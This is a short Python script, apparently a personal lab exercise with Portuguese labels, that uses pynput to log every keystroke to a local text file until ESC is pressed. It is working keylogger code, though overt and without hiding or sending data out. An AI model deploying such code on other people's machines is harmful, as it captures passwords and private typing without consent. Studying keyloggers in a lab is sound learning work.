from pynput.keyboard import Listener, Key
import os

pasta_projeto = r"C:\Users\DoriaN\Desktop\Projetos Github\lab-keylogger"
caminho_log = os.path.join(pasta_projeto, "log_teclas.txt")

print(f"Salvando em: {caminho_log}")

def salvar_tecla(key):
    with open(caminho_log, "a", encoding="utf-8") as arquivo:
        try:
            arquivo.write(key.char)
        except:
            if key == Key.space:
                arquivo.write(" ")
            elif key == Key.enter:
                arquivo.write("\n")
            elif key == Key.backspace:
                arquivo.write("[APAGAR]")
            else:
                arquivo.write(f"[{str(key).upper().split('.')[-1]}]")

def parar(key):
    if key == Key.esc:
        print("Encerrando...")
        return False

print("✅ Keylogger rodando! Digite algo... (ESC para parar)")
with Listener(on_press=salvar_tecla, on_release=parar) as ouvinte:
    ouvinte.join()